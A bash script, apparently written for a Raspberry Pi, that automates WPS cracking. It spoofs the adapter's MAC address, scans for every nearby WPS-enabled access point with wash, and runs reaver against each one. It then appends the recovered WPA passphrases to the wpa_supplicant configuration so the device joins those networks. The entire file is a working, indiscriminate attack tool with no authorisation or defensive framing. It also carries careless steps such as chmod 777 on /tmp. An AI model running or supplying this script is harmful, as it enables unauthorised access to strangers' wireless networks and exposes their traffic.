#!/bin/bash
#This script run scan and crack WPS using wash and reaver

#Color
 col='\033[0;33m'       # Yellow
 nc='\033[0m'       # No Color
 
sudo wpa_cli -i wlan1 scan_results
# Enable monitor-mode
echo -e ${col} "Enabling monitor-mode" ${nc}

 sudo ip link set wlan1 down
 sudo iw wlan1 set monitor none
 sudo macchanger -p wlan1
 sudo ip link set wlan1 up

 sudo chmod 777 /home/pi/hs/
 sudo chmod 777 /tmp
# cd /tmp

# WPS network list
echo -e ${col} "Scaning wps network for 30 sec" ${nc}

 sudo bash -c 'timeout 30s wash -i wlan1 > washout.txt'
 cat washout.txt

# Building bssid only list
 sudo rm bssid.txt
echo -e ${col} "Creating bssid list" ${nc}

 filename='washout.txt'
 while read -r line
 do
   id=$(cut -c-17 <<< "$line")
   echo $id  >> bssid
 done < "$filename"

# Remove B8:27:EB:6E:4D:2B mac of wlan0 from bssid list
 tail -n+3 bssid | sed -e 's/\<B8:27:EB:6E:4D:2B\>//g' | sed -r '/^\s*$/d' > bssid.txt
 rm bssid
 cat bssid.txt

# Cracking using reaver 
echo -e ${col} "Running reaver" ${nc}
 sudo rm wps-pwned.txt

 sudo touch /var/lib/reaver/test
 sudo rm /var/lib/reaver/*
 while IFS= read -r line; do
     sudo timeout 60s reaver -q -i wlan1 -b "$line" >> wps-pwned.txt
 done < bssid.txt

 cp wps-pwned.txt ~/hs/wps-pwned_`date +"%H:%M:%S:%d-%b-%Y"`.txt
 cat wps-pwned.txt
 cd ~/hs && md5sum  * | sort -t ' ' -k 4 -r | awk 'BEGIN{lasthash = ""} $1 == lasthash {print $2} {lasthash = $1}' | xargs rm && cd ~/
 find ~/hs -size 0 -print -delete


# Adding cracked wifi to conf file

a=tmpfile
grep -v "WPS PIN" wps-pwned.txt > $a
sed -i 's/: /=/' $a
sed -i 's/WPA/ /' $a
sed -i 's/AP/ /' $a
sed -i 's/+//' $a
sed -i 's/PSK/psk/' $a
sed -i 's/SSID/ssid/' $a
sed -i 's/[][]//g' $a

sed -i 's/psk/network={ \n   psk/' $a
sed -i 's/.*ssid.*/& \n   }\n/' $a

cat $a
echo -e ${col} "Cracked wifi added to wlan1 configuration" ${nc}

echo "country=IN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1" > header.conf

cat tmpfile >> header.conf
mkdir -p ~/conf_bak
cp header.conf ~/conf_bak/wpa_supplicant-wlan1.conf
find ~/conf_bak -size 0 -print -delete

sudo mkdir -p /etc/wpa_supplicant/backup
sudo cp /etc/wpa_supplicant/wpa_supplicant-wlan1.conf /etc/wpa_supplicant/backup/wpa_supplicant-wlan1.conf.backup_`date +"%H:%M:%S:%d-%b-%Y"` 
sudo find /etc/wpa_supplicant/ -size 0 -print -delete
sudo bash -c 'cat tmpfile5 >> /etc/wpa_supplicant/wpa_supplicant-wlan1.conf'
sudo awk '!seen[$0]++' /etc/wpa_supplicant/wpa_supplicant-wlan1.conf > /tmp/wpa_supplicant-wlan1.conf 
sudo mv /tmp/wpa_supplicant-wlan1.conf /etc/wpa_supplicant/wpa_supplicant-wlan1.conf 

rm -rf tmpfile*

echo -e ${col} "Cracked wifi added to configuration" ${nc}

# Disabling monitor-mode and restore internet
echo -e ${col} "Restoring manged-mode" ${nc}
 sudo ip link set wlan1 down
 sudo iw wlan1 set type managed
 sudo ip link set wlan1 up
#sudo systemctl restart wpa_supplicant@wlan1.service

echo -e ${col} "Finished!!" ${nc}

 sleep 5
 ping -O -c 4 1.1
 
 #sudo systemctl restart wpa_supplicant@wlan1.service
 #sudo systemctl restart wpa_supplicant@wlan0.service
